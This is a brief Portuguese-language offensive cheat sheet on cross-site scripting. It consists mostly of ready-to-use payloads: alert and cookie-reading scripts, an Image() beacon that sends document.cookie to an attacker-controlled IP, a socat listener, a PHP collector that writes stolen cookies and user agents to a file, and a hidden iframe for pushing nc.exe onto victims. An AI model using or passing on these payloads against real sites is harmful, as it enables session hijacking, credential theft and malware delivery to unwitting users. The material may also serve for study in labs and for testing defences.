# XSS

## XSS Reflected
<script>alert('Teste XSS')</script>

## XSS Stored
Possui um impacto maior pois o script fica salvo na página e toda vez que essa página é acessada o script é executado.

```html
<script>alert(document.cookie)</script>
```  
```html
<script>new Image().src="http://192.168.0.100:8081/";</script>
```  
```html
<script>new Image().src="http://192.168.0.100:8081/";</script>
```  

Use o socat para receber as conexões:  
```bash
socat TCP-LISTEN:8081,reuseaddr,fork -
```

### Coletando cookies:

Coletor de cookie:
```php
\\código no servidor
<?php
    $cookie=$_GET['cookie'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $file=fopen('cookie.txt','a');
    fwrite($file,"USER AGENT:$useragent || COOKIE:$cookie \n");
    fclose($file);
?>
```
*Necessário ter um arquivo cookie.txt criado.*  

Script para ser executado no alvo:  
```html
<script>new Image().src="http://192.168.0.100:8081/coletor.php?cookie="+document.cookie;</script>
```

### Download de arquivo  
```html
<iframe>src="http://192.168.0.100:8081/nc.exe" height="0" width="0"</iframe>
```
